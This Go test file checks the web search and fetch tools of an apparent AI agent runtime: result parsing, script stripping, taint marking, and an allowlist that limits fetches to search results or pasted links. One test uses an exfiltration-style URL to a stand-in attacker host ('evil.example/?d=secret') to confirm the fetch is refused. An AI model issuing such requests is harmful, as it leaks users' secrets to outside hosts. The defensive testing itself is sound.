package runs

import (
	"context"
	"encoding/base64"
	"strings"
	"testing"
)

func TestParseSearchUnwrapsLinksAndSkipsBing(t *testing.T) {
	enc := base64.RawURLEncoding.EncodeToString([]byte("https://example.com/echo"))
	page := `<li class="b_algo"><h2><a href="https://www.bing.com/ck/a?!&amp;&amp;p=1&amp;u=a1` + enc + `&amp;ntb=1">Echo <strong>Hotel</strong></a></h2>
<div class="b_caption"><p class="b_lineclamp2">Near the Mall &amp; cheap</p></div></li>
<li class="b_algo"><h2><a href="https://www.bing.com/travel/x">Bing own</a></h2></li>
<li class="b_algo"><h2><a href="http://plain.example.com/">Not https</a></h2></li>`
	hits := parseSearch(page)
	if len(hits) != 1 {
		t.Fatalf("got %d hits: %+v", len(hits), hits)
	}
	if h := hits[0]; h.Title != "Echo Hotel" || h.URL != "https://example.com/echo" || h.Snippet != "Near the Mall & cheap" {
		t.Fatalf("bad hit %+v", h)
	}
}

func TestPageTextKeepsTitleImageAndDropsScripts(t *testing.T) {
	page := `<html><head><title>Echo Hotel</title><meta property="og:image" content="/img/a.jpg"></head>
<body><script>evil()</script><h1>Echo</h1><p>Twin rooms &amp; views</p></body></html>`
	out := pageText("https://example.com/h", page, "text/html")
	for _, want := range []string{"Title: Echo Hotel", "Image: https://example.com/img/a.jpg", "Twin rooms & views"} {
		if !strings.Contains(out, want) {
			t.Fatalf("missing %q in %q", want, out)
		}
	}
	if strings.Contains(out, "evil") {
		t.Fatal("script text leaked")
	}
}

func TestSearchAndFetchTaintTheRun(t *testing.T) {
	if !untrustedTool("web_search") || !untrustedTool("web_fetch") {
		t.Fatal("web tools must taint the run")
	}
}

func TestFetchOnlyReadsPagesFromSearchOrThePerson(t *testing.T) {
	rc := &runCtx{}
	ctx := withRun(context.Background(), rc)
	r := &Runtime{}
	if _, err := r.webFetch(ctx, fetchIn{URL: "https://evil.example/?d=secret"}); err == nil || !strings.Contains(err.Error(), "search result") {
		t.Fatalf("unseen page was not refused: %v", err)
	}
	rc.allowFetch("https://example.com/echo/")
	if !rc.mayFetch("https://example.com/echo") {
		t.Fatal("a page from a search must be readable, trailing slash or not")
	}
	if rc.mayFetch("https://example.com/echo?x=1") {
		t.Fatal("a changed query must not be readable")
	}
}

func TestLinksTheirWayInKeepBalancedParensAndMatchEncoded(t *testing.T) {
	got := linksIn("see https://en.wikipedia.org/wiki/Mercury_(planet), and (https://de.wikipedia.org/wiki/München).")
	if len(got) != 2 || got[0] != "https://en.wikipedia.org/wiki/Mercury_(planet)" || got[1] != "https://de.wikipedia.org/wiki/München" {
		t.Fatalf("got %q", got)
	}
	rc := &runCtx{}
	for _, u := range got {
		rc.allowFetch(u)
	}
	if !rc.mayFetch("https://de.wikipedia.org/wiki/M%C3%BCnchen") {
		t.Fatal("the encoded spelling of a pasted link must match")
	}
}

func TestPastedLinkWithAccentedQueryMatches(t *testing.T) {
	rc := &runCtx{}
	rc.allowFetch("https://x.de/s?q=München&l=de")
	if !rc.mayFetch("https://x.de/s?q=M%C3%BCnchen&l=de") {
		t.Fatal("encoded query must match the pasted one")
	}
}
